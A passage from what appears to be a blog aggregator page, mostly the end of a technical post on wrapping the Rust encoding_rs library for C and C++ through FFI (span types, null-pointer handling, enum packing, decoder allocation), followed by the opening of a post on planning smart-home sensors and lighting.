    <dd><code class="cpp hljs">span[i]</code></dd>
    <dt><code class="rust hljs">slice.len()</code></dt>
    <dd><code class="cpp hljs">span.size()</code></dd>
    <dt><code class="rust hljs">slice.as_ptr()</code></dt>
    <dd><code class="cpp hljs">span.data()</code></dd>
</dl>

<p>GSL relies on C++14, but at the time encoding_rs landed, Gecko was <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1325632#c25">stuck on C++11 thanks to Android</a>. Since, GSL could not be used as-is in Gecko, I backported <code>gsl::span</code> to C++11 as <a href="https://searchfox.org/mozilla-central/source/mfbt/Span.h#375"><code>mozilla::Span</code></a>. The porting process was mainly a matter of ripping out <code>constexpr</code> keywords  and using <code>mozilla::</code> types and type traits  in addition to or instead of standard-library ones. After Gecko moved to C++14, some of the <code>constexpr</code> keywords have been restored.

</p><p>Once we had our own <code>mozilla::Span</code> anyway, it was possible to add Rust-like subspan ergonomics that are missing from <code>gsl::span</code>. For the case where you want a subspan from index <code>i</code> up to but not including index <code>j</code>. <code>gsl::span</code> has:

</p><dl>
    <dt><code class="rust hljs">&amp;slice[i..]</code></dt>
    <dd><code class="cpp hljs">span.subspan(i)</code></dd>
    <dt><code class="rust hljs">&amp;slice[..i]</code></dt>
    <dd><code class="cpp hljs">span.subspan(<span class="hljs-number">0</span>, i)</code></dd>
    <dt><code class="rust hljs">&amp;slice[i..j]</code></dt>
    <dd><code class="cpp hljs">span.subspan(i, j - i)</code> <span class="emoji">üò≠</span></dd>
</dl>

<p><code>mozilla::Span</code> instead has:

</p><dl>
    <dt><code class="rust hljs">&amp;slice[i..]</code></dt>
    <dd><code class="cpp hljs">span.From(i)</code></dd>
    <dt><code class="rust hljs">&amp;slice[..i]</code></dt>
    <dd><code class="cpp hljs">span.To(i)</code></dd>
    <dt><code class="rust hljs">&amp;slice[i..j]</code></dt>
    <dd><code class="cpp hljs">span.FromTo(i, j)</code></dd>
</dl>

<p><code>gsl::span</code> and Rust slices have one crucial difference in how they decompose into a pointer and a length. For zero-length <code>gsl::span</code> it is possible for the pointer to be <code>nullptr</code>. In the case of Rust slices, the pointer must always be non-null and aligned even for zero-length slices. This may look counter-intuitive at first: When the length is zero, the pointer never gets dereferenced, so why doesn‚Äôt matter whether it is null are not? It turns out that it matters for optimizing out the <code>enum</code> discriminant in <code>Option</code>-like enums. <code>None</code> is represented by all-zero bits, so if wrapped in <code>Some()</code>, a slice with null as the pointer and zero as the length would accidentally have the same representation as <code>None</code>. By requiring the pointer to be a potentially bogus non-null pointer, a zero-length slice inside an <code>Option</code> can be represented distinctly from <code>None</code> without a discriminant. By requiring the pointer to be aligned, further uses of the low bits of the pointer are possible when the alignment of the slice element type is greater than one.

</p><p>After realizing that it‚Äôs not okay to pass the pointer obtained from C++ <code>gsl::span::data()</code> to Rust <code>std::slice::from_raw_parts()</code> as-is, it was necessary to decide where to put the replacement of <code>nullptr</code> with <code>reinterpret_cast&lt;T*&gt;(alignof(T))</code>. There are two candidate locations when working with actual <code>gsl::span</code>: In the Rust code that provides the FFI or in the C++ code that calls the FFI. When working with <code>mozilla::Span</code>, the code of the span implementation itself could be changed, so there are two additional candidate locations for the check: the constructor of <code>mozilla::Span</code> and the getter for the pointer.

</p><p>Of these for candidate locations, the constructor of <code>mozilla::Span</code> seemed like the one where the compiler has the best opportunity to optimize out the check in some cases. That‚Äôs why I chose to put the check there. This means that in the <code>gsl::span</code> scenario the check had to go in the code that calls the FFI. All pointers obtained from <code>gsl::span</code> have to be laundered through:

</p><pre><code class="cpp hljs"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;
<span class="hljs-title">static</span> <span class="hljs-title">inline</span> <span class="hljs-title">T</span>* <span class="hljs-title">null_to_bogus</span>(<span class="hljs-title">T</span>* <span class="hljs-title">ptr</span>)
{</span>
    <span class="hljs-keyword">return</span> ptr ? ptr : <span class="hljs-keyword">reinterpret_cast</span>&lt;T*&gt;(<span class="hljs-keyword">alignof</span>(T));
}</code></pre>

<p>Additionally, this means that since the check is not in the code that provides the FFI, the C API became slightly unidiomatic in the sense that requires C callers to avoid passing in <code>NULL</code> even when the length is zero. However, the C API already has many caveats about things that are Undefined Behavior, and adding yet another thing that is documented to be Undefined Behavior does seem like an idiomatic thing to do with C.

</p><h5>Putting it Together</h5>

<p>Let‚Äôs look at an example of how the above features combine. First, in Rust we have a method that takes a slice and returns an optional tuple:

</p><pre><code class="hljs rust"><span class="hljs-keyword">impl</span> Encoding {
    <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">for_bom</span></span>(buffer: &amp;[<span class="hljs-built_in">u8</span>]) -&gt;
        <span class="hljs-built_in">Option</span>&lt;(&amp;<span class="hljs-symbol">'static</span> Encoding, <span class="hljs-built_in">usize</span>)&gt;
    {
        <span class="hljs-keyword">if</span> buffer.starts_with(<span class="hljs-string">b"\xEF\xBB\xBF"</span>) {
            <span class="hljs-literal">Some</span>((UTF_8, <span class="hljs-number">3</span>))
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> buffer.starts_with(<span class="hljs-string">b"\xFF\xFE"</span>) {
            <span class="hljs-literal">Some</span>((UTF_16LE, <span class="hljs-number">2</span>))
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> buffer.starts_with(<span class="hljs-string">b"\xFE\xFF"</span>) {
            <span class="hljs-literal">Some</span>((UTF_16BE, <span class="hljs-number">2</span>))
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">None</span>
        }
    }
}</code></pre>

<p>Since this is a static method, there is no reference to <code>self</code> and no corresponding pointer in the FFI function. The slice decomposes into a pointer and a length. The length becomes an in/out param that communicates the length of the slice in and the length of the BOM sublice out. The encoding becomes the return value and the encoding pointer being null communicates the Rust <code>None</code> case for the tuple.

</p><pre><code class="hljs rust"><span class="hljs-meta">#[no_mangle]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">encoding_for_bom</span></span>(buffer: *<span class="hljs-keyword">const</span> <span class="hljs-built_in">u8</span>,
                                          buffer_len: *<span class="hljs-keyword">mut</span> <span class="hljs-built_in">usize</span>)
                                          -&gt; *<span class="hljs-keyword">const</span> Encoding
{
    <span class="hljs-keyword">let</span> buffer_slice =
        ::std::slice::from_raw_parts(buffer, *buffer_len);
    <span class="hljs-keyword">let</span> (encoding, bom_length) =
        <span class="hljs-keyword">match</span> Encoding::for_bom(buffer_slice) {
        <span class="hljs-literal">Some</span>((encoding, bom_length)) =&gt;
            (encoding <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> Encoding, bom_length),
        <span class="hljs-literal">None</span> =&gt; (::std::ptr::null(), <span class="hljs-number">0</span>),
    };
    *buffer_len = bom_length;
    encoding
}</code></pre>

<p>In the C header, the signature looks like this:

</p><pre><code class="c hljs cpp"><span class="hljs-function">ENCODING_RS_ENCODING <span class="hljs-keyword">const</span>*
<span class="hljs-title">encoding_for_bom</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> <span class="hljs-keyword">const</span>* buffer, <span class="hljs-keyword">size_t</span>* buffer_len)</span></span>;</code></pre>

<p>The C++ layer then rebuilds the analog of the Rust API on top of the C API:

</p><pre><code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Encoding</span> <span class="hljs-title">final</span> {</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-built_in">std</span>::optional&lt;
        <span class="hljs-built_in">std</span>::tuple&lt;gsl::not_null&lt;<span class="hljs-keyword">const</span> Encoding*&gt;, <span class="hljs-keyword">size_t</span>&gt;&gt;
    for_bom(gsl::span&lt;<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span>&gt; buffer)
    {
        <span class="hljs-keyword">size_t</span> len = buffer.size();
        <span class="hljs-keyword">const</span> Encoding* encoding =
            encoding_for_bom(null_to_bogus(buffer.data()), &amp;len);
        <span class="hljs-keyword">if</span> (encoding) {
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::make_tuple(
                gsl::not_null&lt;<span class="hljs-keyword">const</span> Encoding*&gt;(encoding), len);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::nullopt;
    }
};</code></pre>

<p>Here we have to exlicitly use <code>std::make_tuple</code>, because the implicit constructor doesn‚Äôt work when the <code>std::tuple</code> is nested inside <code>std::optional</code>.

</p><h5>Algebraic Types</h5>

<p>Early on, we saw that the Rust-side streaming API can return this <code>enum</code>:

</p><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">DecoderResult</span></span> {
    InputEmpty,
    OutputFull,
    Malformed(<span class="hljs-built_in">u8</span>, <span class="hljs-built_in">u8</span>),
}</code></pre>

<p>C++ now has an analog for Rust <code>enum</code>, sort of: <code>std::variant&lt;Types...&gt;</code>. In practice, though, <code>std::variant</code> is so clunky that it does not make sense to use it when a Rust <code>enum</code> is supposed to act in a lightweight way from the point view of ergonomics.

</p><p>First, the variants in <code>std::variant</code> aren‚Äôt named. They are identified positionally or by type. Named variants were proposed as proposed as <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2016/p0095r1.html"><code>lvariant</code></a> but did not get accepted. Second, even though duplicate types are permitted, working with them is not practical. Third, there is no language-level analog for Rust‚Äôs <a href="https://doc.rust-lang.org/book/second-edition/ch06-02-match.html"><code>match</code></a>. A <code>match</code>-like mechanism was proposed as <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2016/p0095r1.html"><code>inspect()</code></a> but was not accepted.

</p><p>On the FFI/C layer, the information from the above <code>enum</code> is packed into a <code>u32</code>. Instead of trying to expand it to something fancier on the C++ side, the C++ API uses the same <code>uint32_t</code> as the C API. If the caller actually cares about extracting the two small integers in the malformed case, it‚Äôs up to the caller to do the bitwise ops to extract them from the <code>uint32_t</code>.

</p><p>The FFI code looks like this:

</p><pre><code class="rust hljs"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> INPUT_EMPTY: <span class="hljs-built_in">u32</span> = <span class="hljs-number">0</span>;

<span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> OUTPUT_FULL: <span class="hljs-built_in">u32</span> = <span class="hljs-number">0xFFFFFFFF</span>;

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">decoder_result_to_u32</span></span>(result: DecoderResult) -&gt; <span class="hljs-built_in">u32</span> {
    <span class="hljs-keyword">match</span> result {
        DecoderResult::InputEmpty =&gt; INPUT_EMPTY,
        DecoderResult::OutputFull =&gt; OUTPUT_FULL,
        DecoderResult::Malformed(bad, good) =&gt;
            (good <span class="hljs-keyword">as</span> <span class="hljs-built_in">u32</span>) &lt;&lt; <span class="hljs-number">8</span>) | (bad <span class="hljs-keyword">as</span> <span class="hljs-built_in">u32</span>),
    }
}</code></pre>

<p>Using zero as the magic value for <code>INPUT_EMPTY</code> is a premature micro-optimization. On some architectures comparison with zero is cheaper than comparison with other constants, and the values representing the malformed case when decoding and the unmappable case when encoding are known not to overlap zero.

</p><h5>Signaling Integer Overflow</h5>

<p><code>Decoder</code> and <code>Encoder</code> have methods for querying worst-case output buffer size requirement. The caller provides the number of input code units and the method returns the smallest output buffer length, in code units, that guarantees that the corresponding conversion method will not return <code>OutputFull</code>.

</p><p>E.g. when encoding from UTF-16 to UTF-8, calculating the worst case involves multiplication by three. Such a calculation can, at least in principle, result in integer overflow. In Rust, integer overflow is considered safe, because even if you allocate too short a buffer as a result of its length computation overflowing, actually accessing the buffer is bound checked, so the overall result is safe. However, buffer access is not generally bound checked in C or C++, so an integer overflow in Rust can result in memory unsafety in C or C++ if the result of the calculation that overflowed is used for deciding the size of buffers allocated and accessed by C or C++ code. In the case of encoding_rs, even when C or C++ allocates the buffer, the writing is supposed to be performed by Rust code, so it might be OK. However, to be sure, the worst-case calculations provided by encoding_rs used overflow-checking arithmetic.

</p><p>In Rust, the methods whose arithmetic is overflow-checked return <code>Option&lt;usize&gt;</code>. To keep the types of the C API simple, the C API returns <code>size_t</code> with <code>SIZE_MAX</code> signaling overflow. That is, the C API effectively appears as using saturating arithmetic.

</p><p>In the C++ API version that uses standard-library types, the return type is <code>std::optional&lt;size_t&gt;</code>. In Gecko, we have a wrapper for integer types that provides overflow-checking arithmetic and a validity flag. In the Gecko version of the C++ API, the return type is <code>mozilla::CheckedInt&lt;size_t&gt;</code> so that dealing with overflow signaling is uniform with the rest of Gecko code. (Aside: I find it shocking and dangerous that the C++ standard library <i>still</i> does not provide a wrapper similar to <code>mozilla::CheckedInt</code> in order to do overflow-checking integer math in a standard-supported Undefined Behavior-avoiding way.)

</p><h3>Recreating the Non-Streaming API</h3>

<p>Let‚Äôs look again at the example of a non-streaming API method on <code>Encoding</code>:

</p><pre><code class="hljs rust"><span class="hljs-keyword">impl</span> Encoding {
    <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">decode_without_bom_handling_and_without_replacement</span></span>&lt;<span class="hljs-symbol">'a</span>&gt;(
        &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">self</span>,
        bytes: &amp;<span class="hljs-symbol">'a</span> [<span class="hljs-built_in">u8</span>],
    ) -&gt; <span class="hljs-built_in">Option</span>&lt;Cow&lt;<span class="hljs-symbol">'a</span>, <span class="hljs-built_in">str</span>&gt;&gt;
}</code></pre>

<p>This type inside the <code>Option</code> in the return type is <code>Cow&lt;'a, str&gt;</code>, which is a type that holds either an owned <code>String</code> or a borrowed string slice (<code>&amp;'a str</code>) whose data is owned by someone else. The lifetime <code>'a</code> of the borrowed string slice is the lifetime of the input slice (<code>bytes: &amp;'a [u8]</code>), because in the borrow case the output is actually borrowed from the input.

</p><p>Mapping this kind of return type to C poses problems. First of all, C does not provide a great way to say that we either have the owned case or we have the borrowed case. Second, C does not have a standard type for heap-allocated strings that know their length and capacity and that can reallocate their buffer when modified. Maybe this could be seen as an opportunity to create a new C type whose buffer is managed by Rust <code>String</code>, but then such a type would not fit together with C++ strings. Third, a borrowed string slice in C would be a raw pointer and a length and some documentation that says that the pointer is valid only as long as the input pointer is valid. There would be no language-level safeguards against use-after-free.

</p><p>The solution is not to provide the non-streaming API on the C layer at all. On the Rust side, the non-streaming API is a convenience API built on top of the streaming API and some validation functions (ASCII validation, UTF-8 validation, ISO-2022-JP ASCII state validation). Instead of trying to provide FFI bindings for the non-streaming API in an inconvenient manner, a similar non-streaming API can be recreated in C++ on top of the streaming API and the validation functions that were suitable for FFI.

</p><p>While the C++ type system could represent the same kind of structure as Rust‚Äôs <code>Cow&lt;'a, str&gt;</code> e.g. as <code>std::variant&lt;std::string_view, std::string&gt;</code>, such a C++ <code>Cow</code> would be unsafe, because the lifetime <code>'a</code> would not be enforced by C++. While a <code>std::string_view</code> (or <code>gsl::span</code>) is (mostly) OK as an argument in C++, as a return type it‚Äôs use-after-free waiting to happen. As with C, at best there would be some documentation saying that the output <code>std::string_view</code> is valid for as long as the input <code>gsl::span</code> is valid.

</p><p>To avoid use-after-free risk, in the C++ API version that uses C++17 standard-library types, I simply ended up making the C++ <code>decode_without_bom_handling_and_without_replacement()</code> always copy and return a <code>std::optional&lt;std::string&gt;</code>.

</p><p>In the case of Gecko though, it‚Äôs possible to do better while keeping things safe. Gecko uses <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Tech/XPCOM/Guide/Internal_strings">XPCOM strings</a>, which provide a variety of storage options, notably: dependent strings that (unsafely) borrow storage owned by someone else, auto strings that store short strings in an inline buffer and shared strings that point to heap-allocated reference-counted buffer.

</p><p>In the case where the buffer to decode is in an XPCOM string that points to a reference-counted heap-allocated buffer and we are decoding to UTF-8 (as opposed to UTF-16), in the cases where we‚Äôd borrow in Rust (expect for BOM removal cases), we can instead make the output string point the same reference-counted heap-allocated buffer that the input points to (and increment the reference count). This is indeed what the non-streaming API for <code>mozilla::Encoding</code> does.

</p><p>Compared to Rust, there is a limitation beyond the input string having to use reference-counted storage for the copy avoidance to work: The input must not have the UTF-8 BOM in the cases where the BOM is removed. While Rust can borrow a subslice of the input excluding the BOM, with XPCOM strings just incrementing a reference count only works if the byte content of the input and output is the entirely the same. When the first three bytes need to be omitted, it‚Äôs not the entirely the same.

</p><p>While the C++ API version that uses C++17 standard library types builds the non-streaming API on top of the streaming API in C++, for added safety, the non-streaming part of <code>mozilla::Encoding</code> is not actually built on the streaming C++ API in C++ but built on top of the streaming Rust API <a href="https://searchfox.org/mozilla-central/source/intl/encoding_glue/src/lib.rs">in Rust</a>. In Gecko, we have <a href="https://searchfox.org/mozilla-central/source/servo/support/gecko/nsstring/src/lib.rs">Rust bindings for XPCOM strings</a>, so it‚Äôs possible to manipulate XPCOM strings from Rust.

</p><h3>Epilog: Do We Really Need to Hold <code>Decoder</code> and <code>Encoder</code> by Pointer?</h3>

<p>Apart from having to copy in the non-streaming API due to C++ not having a safe mechanism for borrows, it‚Äôs a bit disappointing that instantiating <code>Decoder</code> and <code>Encoder</code> from C++ involves a heap allocation while Rust callers get to allocate these types on the stack. Can we get rid of the heap allocation for C++ users of the API?

</p><p>The answer is that we could, but to do it properly we‚Äôd end up with the complexity of making the C++ build system generate constants by querying them from rustc.

</p><p>We can‚Äôt return a non-C-like struct over the FFI by value, but given a suitably-aligned pointer to enough memory, we can write a non-C-like struct to memory provided by the other side of the FFI. In fact, the API supports this as an optimization of instantiating a new <code>Decoder</code> into a heap allocation made by Rust previously:

</p><pre><code class="rust hljs"><span class="hljs-meta">#[no_mangle]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">encoding_new_decoder_into</span></span>(
    encoding: *<span class="hljs-keyword">const</span> Encoding,
    decoder: *<span class="hljs-keyword">mut</span> Decoder)
{
    *decoder = (*encoding).new_decoder();
}</code></pre>

<p>Even though documentation says that <code>encoding_new_decoder_into()</code> should only be used with pointers to <code>Decoder</code> previously obtained from the API, in the case of <code>Decoder</code>, assigning with <code>=</code> would be OK even if the memory pointed to by the pointer was uninitialized, because <code>Decoder</code> does not implement <code>Drop</code>. That is, in C++ terms, <code>Decoder</code> in Rust does not have a destructor, so assignment with <code>=</code> does not do any clean-up with the assumption that the pointer points to a previous valid <code>Decoder</code>.

</p><p>When writing a Rust struct that implements <code>Drop</code> into uninitialized memory, <code>std::ptr::write()</code> should be used instead of <code>=</code>. <code>std::ptr::write()</code> ‚Äúoverwrites a memory location with the given value without reading or dropping the old value‚Äù. Perhaps it would set a good example to use <code>std::ptr::write()</code> even in the above case, even though it‚Äôs not strictly necessary.

</p><p>When working with a pointer previously obtained from Rust <code>Box</code>, the pointer is aligned correctly and points to a sufficiently large piece of memory. If C++ is to allocate stack memory for Rust code to write into, we need to make the C++ code use the right size and alignment. The issue of communicating these two numbers from Rust to C++ is already where things start getting brittle.

</p><p>The C++ code needs to discover the right size and alignment for the struct. These cannot be discovered by calling FFI functions, because C++ needs to know them at compile time. Size and alignment aren‚Äôt just constants that could be written manually in a header file once and forgotten. First of all, they change when the Rust structs change, so just writing them down has the risk of the written-down values getting out of sync with the real requirements as the Rust code changes. Second, the values differ on 32-bit architectures vs. 64-bit architectures. Third, and this is the worst, the alignment can differ from one 32-bit architecture to another. Specifically, the alignment of <code>f64</code> is <code>8</code> on most targets, like <a href="https://rust.godbolt.org/z/IE1t4G">ARM</a>, <a href="https://rust.godbolt.org/z/PBLXeU">MIPS</a> and <a href="https://rust.godbolt.org/z/ErGoPf">PowerPC</a>, but the alignment of <code>f64</code> is <code>4</code> on <a href="https://rust.godbolt.org/z/4jS6lf">x86</a>. If Rust gets an <a href="https://lists.llvm.org/pipermail/llvm-dev/2018-August/125325.html">m68k port</a>, even more <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1325771#c49">variety of alignments across 32-bit platforms is to be expected</a>.

</p><p>It seems that the only way to get this right is to get the size and alignment information from rustc as part of the build process before the C++ code is built so that the numbers can be written in a generated C++ header file that the C++ code can then refer to. The simple way to do this would be to have the build system compile and run a tiny Rust program that prints out a C++ header with numbers obtained using <a href="https://doc.rust-lang.org/std/mem/fn.size_of.html"><code>std::mem::size_of</code></a> and <a href="https://doc.rust-lang.org/std/mem/fn.align_of.html"><code>std::mem::align_of</code></a>. This solution assumes that the build system runs on the architecture that the compilation is targeting, so this solution would break cross-compilation. That‚Äôs not good.

</p><p>We need to extract target-specific size and alignment from a given struct from rustc but without having to run a binary built for the target. <a href="https://blog.mozilla.org/nnethercote/2018/11/09/how-to-get-the-size-of-rust-types-with-zprint-type-sizes/">It turns out</a> that rustc has a command-line option, <code>-Zprint-type-sizes</code>, that prints out the size and alignment of types. Unfortunately, the feature is nightly-only‚Ä¶ Anyway, the most correct way to go about this would be to have a build script controlling C++ compilation first invoke rustc with that option, parse out the sizes and aligments of interest, and generate a C++ header file with the numbers as constants.

</p><p>Or, since overaligning is permitted, we could trust that the struct will not have a SIMD member (alignment 16 for 128-bit vectors) and always align to 8. We could also check the size on 64-bit platforms, always use that and hope for the best (especially hope that whenever the struct grows in Rust, someone remembers to update the C++-visible size). But hoping for the best in memory matters kind of defeats the point of using Rust.

</p><p>Anyway, assuming that we have constants <code>DECODER_SIZE</code> and <code>DECODER_ALIGNMENT</code> available to C++ <i>somehow</i>, we can do this:

</p><pre><code class="cpp hljs"><span class="hljs-function">class <span class="hljs-title">alignas</span><span class="hljs-params">(DECODER_ALIGNMENT)</span> Decoder final
</span>{
  <span class="hljs-keyword">friend</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Encoding</span>;</span>
<span class="hljs-keyword">public</span>:
  ~Decoder() {}
  Decoder(Decoder&amp;&amp;) = <span class="hljs-keyword">default</span>;
<span class="hljs-keyword">private</span>:
  <span class="hljs-keyword">unsigned char</span> storage[DECODER_SIZE];
  Decoder() = <span class="hljs-keyword">default</span>;
  Decoder(<span class="hljs-keyword">const</span> Decoder&amp;) = <span class="hljs-keyword">delete</span>;
  Decoder&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Decoder&amp;) = <span class="hljs-keyword">delete</span>;
  <span class="hljs-comment">// ...</span>
};</code></pre>

<p>Notably:

</p><ul>
    <li>Instead of the constructor <code>Decoder()</code> being marked <code>delete</code>, it is marked <code>default</code> but still <code>private</code>.</li>
    <li><code>Encoding</code> is declared as a <code>friend</code> to grant it access to the above-mentioned constructor.</li>
    <li>A <code>public</code> default move constructor is added.</li>
    <li>A single <code>private</code> field of type <code>unsigned char[DECODER_SIZE]</code> is added.</li>
    <li><code>Decoder</code> itself is declared with <code>alignas(DECODER_ALIGNMENT)</code>.</li>
    <li><code>operator delete</code> is no longer overloaded.</li>
</ul>

<p>Then <code>new_decoder()</code> on <code>Encoding</code> can be written like this (and be renamed <code>make_decoder</code> to avoid unidiomatic use of the word ‚Äúnew‚Äù in C++):

</p><pre><code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Encoding</span> <span class="hljs-title">final</span>
{</span>
<span class="hljs-keyword">public</span>:
  <span class="hljs-function"><span class="hljs-keyword">inline</span> Decoder <span class="hljs-title">make_decoder</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span>
  </span>{
    Decoder decoder;
    encoding_new_decoder_into(<span class="hljs-keyword">this</span>, &amp;decoder);
    <span class="hljs-keyword">return</span> decoder;
  }
  <span class="hljs-comment">// ...</span>
};</code></pre>

<p>And it can be used like this:

</p><pre><code class="cpp hljs">Decoder decoder = input_encoding-&gt;make_decoder();</code></pre>

<p>Note that outside the implementation of <code>Encoder</code> trying to just declare <code>Decoder decoder;</code> without initializing it right away initializing is a compile-time error, because the constructor <code>Decoder()</code> is private.

</p><p>Let‚Äôs unpack what‚Äôs happening:

</p><ul>
    <li>The array of <code>unsigned char</code> provides storage for the Rust <code>Decoder</code>.</li>
    <li>The C++ <code>Decoder</code> has no base class, virtual methods, etc., so there are no implementation-supplied hidden members and the address of a <code>Decoder</code> is the same as the address of its <code>storage</code> member, so we can simply pass the address of <code>Decoder</code> itself to Rust.</li>
    <li>The alignment of <code>unsigned char</code> is 1, i.e. unrestricted, so <code>alignas</code> on the <code>Decoder</code> gets to determine the alignment.</li>
    <li>The default trivial move constructor <code>memmove</code>s the bytes of the <code>Decoder</code>, and the Rust <code>Decoder</code> is OK to move.</li>
    <li>The private default no-argument constructor makes it a compile error to try to declare a not-immediately-initialized instance of the C++ <code>Decoder</code> outside the implementation of <code>Encoder</code>.</li>
    <li><code>Encoder</code>, however, can instantiate an uninitialized <code>Decoder</code> and pass a pointer to it to Rust, so that Rust code can write the Rust <code>Decoder</code> instance into the C++-provided memory via the pointer.</li>
</ul></div></div><div class="permalink"><a href="https://hsivonen.fi/modern-cpp-in-rust/">by Henri Sivonen at <time datetime="2018-12-03T09:39:31Z" title="December 03, 2018 09:39 AM GMT">‰∏ãÂçà5:39:31</time></a></div></div><div class="news daniel-pocock" xml:lang="en"><a id="news-55"></a><h3><a href="https://danielpocock.com/tags/mozilla" title="DanielPocock.com - mozilla">Daniel Pocock</a> ‚Äî <a href="https://danielpocock.com/smart-home-where-to-start">Smart home: where to start?</a></h3><div class="entry"><div class="content"><div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even"><p>My home automation plans have been progressing and I'd like to share some observations I've made about planning a project like this, especially for those with larger houses.</p>
<p>With so many products and technologies, it can be hard to know where to start.  Some things have become straightforward, for example, <a href="https://www.domoticz.com/">Domoticz</a> can soon be installed from a <a href="https://bugs.debian.org/899058">package</a> on some distributions.  Yet this simply leaves people contemplating what to do next.</p>
<h3>The quickstart</h3>
<p>For a small home, like an apartment, you can simply buy something like the <a href="https://zigate.fr/">Zigate</a>, a single motion and temperature sensor, a couple of smart bulbs and expand from there.</p>
<p>For a large home, you can also get your feet wet with exactly the same approach in a single room.  Once you are familiar with the products,  use a more structured approach to plan a complete solution for every other space.</p>
<p>The Debian wiki has started gathering some notes on <a href="https://wiki.debian.org/HomeAutomation">things that work easily on GNU/Linux systems like Debian</a> as well as Fedora and others.</p>
<p><img src="zigate.jpg" width="400" /></p>
<h3>Prioritize</h3>
<p>What is your first goal?  For example, are you excited about having smart lights or are you more concerned with improving your heating system efficiency with zoned logic?</p>
<p>Trying to do everything at once may be overwhelming.  Make each of these things into a separate sub-project or milestone.</p>
<h3>Technology choices</h3>
<p>There are many technology choices:</p>
<ul><li><a href="https://en.wikipedia.org/wiki/Zigbee">Zigbee</a>, Z-Wave or another protocol?  I'm starting out with a preference for Zigbee but may try some Z-Wave devices along the way.</li>
<li>E27 or B22 (Bayonet) light bulbs?  People in the UK and former colonies may have B22 light sockets and lamps.  For new deployments, you may want to standardize on E27.  Amongst other things, E27 is used by all the Ikea lamp stands and if you want to be able to move your expensive new smart bulbs between different holders in your house at will, you may want to standardize on E27 for all of them and avoid buying any Bayonet / B22 products in future.</li>
<li>Wired or wireless?  Whenever you take up floorboards, it is a good idea to add some new wiring.  For example, CAT6 can carry both power and data for a diverse range of devices.</li>
<li>Battery or mains power?  In an apartment with two rooms and less than five devices, batteries may be fine but in a house, you may end up with more than a hundred sensors, radiator valves, buttons, and switches and you may find yourself changing a battery in one of them every week.  If you have lodgers or tenants and you are not there to change the batteries then this may cause further complications.  Some of the sensors have a socket for an optional power supply, <a href="https://duckduckgo.com/?q=aa+battery+eliminator&amp;t=ffab&amp;iar=images&amp;iax=images&amp;ia=images">battery eliminators</a> may also be an option.</li>
</ul><h3>Making an inventory</h3>
<p>Creating a spreadsheet table is extremely useful.</p>
<p>This helps estimate the correct quantity of sensors, bulbs, radiator valves and switches and it also helps to budget.  Simply print it out, leave it under the Christmas tree and hope Santa will do the rest for you.</p>
<p>Looking at my own house, these are the things I counted in a first pass:</p>
<p><img src="home-auto-inventory.png" /></p>
<p>Don't forget to include all those unusual spaces like walk-in pantries, a large cupboard under the stairs, cellar, en-suite or enclosed porch.  Each deserves a row in the table.</p>
<h3>Sensors help make good decisions</h3>
<p>Whatever the aim of the project, sensors are likely to help  obtain useful data about the space and this can help to choose and use other products more effectively.</p>
<p>Therefore, it is often a good idea to choose and deploy sensors through the home before choosing other products like radiator valves and smart bulbs.</p>
<h3>The smartest place to put those smart sensors</h3>
<p>When placing motion sensors, it is important to avoid putting them too close to doorways where they might detect motion in adjacent rooms or hallways.  It is also a good idea to avoid putting the sensor too close to any light bulb: if the bulb attracts an insect, it will trigger the motion sensor repeatedly.  Temperature sensors shouldn't be too close to heaters or potential draughts around doorways and windows.</p>
<p>There are a range of all-in-one sensors available, some have <a href="http://www.oomi.com/discover/multisensor/">up to six features in one device smaller than an apple</a>.  In some rooms this is a convenient solution but in other rooms, it may be desirable to have separate motion and temperature sensors in different locations.</p>
<p>Consider the dining and sitting rooms in my own house, illustrated in the floorplan below.  The sitting room is also a potential 6th bedroom or guest room with sofa bed, the downstairs shower room conveniently located across the hall.  The dining room is joined to the sitting room by a sliding double door.  When the sliding door is open, a 360 degree motion sensor in the ceiling of the sitting room may detect motion in the dining room and vice-versa.  It appears that 180 degree motion sensors located at the points "1" and "2" in the floorplan may be a better solution.</p>
<p>These rooms have wall mounted radiators and fireplaces.  To avoid any of these potential heat sources the temperature sensors should probably be in the middle of the room.</p>
<p><img src="sitting-dining-sensors.png" width="600" /></p>
